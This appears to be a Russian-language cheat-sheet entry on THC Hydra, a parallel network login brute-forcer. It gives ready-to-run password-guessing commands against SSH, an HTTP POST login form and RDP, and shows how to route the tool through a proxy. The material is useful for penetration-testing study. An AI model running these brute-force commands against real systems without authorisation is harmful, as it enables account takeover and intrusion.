# Hydra

## 1. Определения

**THC Hydra** (или просто Hydra) — это высокопроизводительный, параллелизированный взломщик сетевых аутентификаций. Он поддерживает множество протоколов и позволяет проводить быстрые атаки методом перебора ([brute-force](../Concepts/brute_force_attacks.md)) или по словарю.

## 2. Основные концепции

Hydra работает путем подключения к целевому сервису и попытки аутентификации с использованием предоставленных списков логинов и паролей.

- **Параллелизация**: Ключевое преимущество Hydra — возможность запускать множество попыток входа одновременно (в несколько потоков), что значительно ускоряет процесс.
- **Поддержка протоколов**: Поддерживает более 50 протоколов, включая `ssh`, `ftp`, `http-post-form`, `http-get`, `smb`, `smtp`, `rdp`, `vnc` и многие другие.
- **Гибкость**: Позволяет использовать один логин и много паролей, один пароль и много логинов, или комбинации из списков.

**Общий синтаксис:**
```bash
hydra [[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE] [options] service://target
```

## 3. Практические сценарии

### Атака на SSH
Подбор пароля для пользователя `root` из файла `pass.list`.
```bash
# -l - один логин
# -P - файл с паролями
# -t 4 - количество потоков
hydra -l root -P pass.list ssh://192.168.1.1 -t 4
```

### Атака на веб-форму (HTTP POST)
Подбор логина и пароля для формы входа на `login.php`.
```bash
# -L - файл с логинами
# -P - файл с паролями
# Формат: /<путь>:<параметры_запроса>:<сообщение_об_ошибке>
hydra -L user.list -P pass.list 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```
- `^USER^` и `^PASS^` — это плейсхолдеры, которые Hydra заменяет значениями из списков.
- `"Login failed"` — строка, которая появляется на странице в случае неудачной попытки входа. Hydra использует ее, чтобы понять, что пара логин/пароль неверна.

### Атака на RDP
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.1
```

## 4. Продвинутые детали

### Графический интерфейс
У Hydra есть графическая оболочка `hydra-gtk` (`xhydra`), которая упрощает настройку параметров атаки.

### Опции производительности
- `-t TASKS`: Увеличение количества потоков может ускорить атаку, но также может привести к блокировке со стороны цели или вызвать нестабильность сети.
- `-w SECONDS`: Время ожидания ответа от сервера. Увеличение может помочь при работе с медленными сервисами.

### Использование с прокси
Hydra поддерживает работу через прокси с помощью переменной окружения `HYDRA_PROXY`.
```bash
# HTTP прокси
export HYDRA_PROXY=http://proxy.example.com:8080

# SOCKS5 прокси
export HYDRA_PROXY=socks5://proxy.example.com:1080
```
